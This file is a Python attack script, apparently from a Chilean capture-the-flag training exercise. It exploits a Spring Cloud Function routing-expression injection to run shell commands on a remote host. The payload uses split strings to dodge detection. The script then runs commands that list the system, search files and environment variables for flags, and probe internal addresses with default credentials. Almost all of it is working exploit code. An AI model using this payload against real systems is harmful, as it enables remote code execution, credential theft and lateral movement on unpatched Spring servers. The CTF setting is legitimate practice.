#!/usr/bin/env python3
"""
CTF Chile - Exploración rápida del servicio actual en puerto 32785
"""
import requests

TARGET = "http://training-pod2.ctfchile.com:32785"
ROUTER = TARGET + "/functionRouter"

def quick_rce(cmd, desc=""):
    """Ejecutar comando RCE y mostrar resultado directamente"""
    payload = f'T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("exe"+"c",new String[]{{}}.getClass()).invoke(T(java.lang.Class).forName("java.lang.Runt"+"ime").getMethod("getRunt"+"ime").invoke(null),new String[]{{"/bin/sh","-c","{cmd}"}}).waitFor()'
    try:
        r = requests.post(ROUTER, headers={
            "spring.cloud.function.routing-expression": payload,
            "Content-Type": "text/plain",
        }, data="x", timeout=15)
        print(f"[{r.status_code}] {desc}")
        print(f"CMD: {cmd}")
        if r.text and len(r.text) < 1000:
            print(f"RESP: {r.text}")
        print("-" * 50)
        return r.status_code == 500  # 500 means RCE worked
    except Exception as e:
        print(f"[ERR] {e}")
        return False

print("="*60)
print("EXPLORACIÓN RÁPIDA PUERTO 32785")
print("="*60)

# Verificar servicio
try:
    r = requests.get(TARGET)
    print(f"[INFO] Servicio principal: HTTP {r.status_code}")
    if r.text:
        print(f"RESP: {r.text[:200]}...")
except Exception as e:
    print(f"[ERR] Servicio principal: {e}")

print("\n[COMANDOS BÁSICOS]")
quick_rce("whoami && hostname", "Información básica")
quick_rce("pwd && ls -la", "Directorio actual")

print("\n[BUSCAR FLAGS DIRECTO]")
quick_rce("find / -name '*flag*' -type f 2>/dev/null | head -3 | xargs cat 2>/dev/null", "Archivos flag")
quick_rce("cat /flag.txt 2>/dev/null || cat /root/flag.txt 2>/dev/null || echo 'NO_FLAG_FILES'", "Ubicaciones comunes")

print("\n[BUSCAR EN APLICACIÓN]")
quick_rce("strings /app/app.jar | grep -i ctfchile | head -3", "Flag en JAR")
quick_rce("grep -r 'ctfchile{' /app 2>/dev/null | head -2", "Grep recursivo /app")

print("\n[SERVICIOS INTERNOS]")
quick_rce("netstat -tlnp 2>/dev/null | grep LISTEN | head -5", "Puertos locales")

# Probar servicios internos conocidos
hosts = ["10.160.209.1", "10.109.220.1"]
for host in hosts:
    print(f"\n[SERVICIO {host}]")
    quick_rce(f"curl -s -I http://{host}:8000/ | head -2", f"Verificar {host}")
    quick_rce(f"curl -s http://{host}:8000/docs | head -5", f"Docs {host}")

    # Probar autenticación conocida
    quick_rce(f"curl -s -u monitorRole:QED http://{host}:8000/execute | head -3", f"Auth JMX {host}")

print("\n[BÚSQUEDA EN VARIABLES]")
quick_rce("env | grep -i flag || env | grep -i ctf || echo 'NO_ENV_FLAGS'", "Variables entorno")

print("="*60)
print("EXPLORACIÓN COMPLETADA")
print("="*60)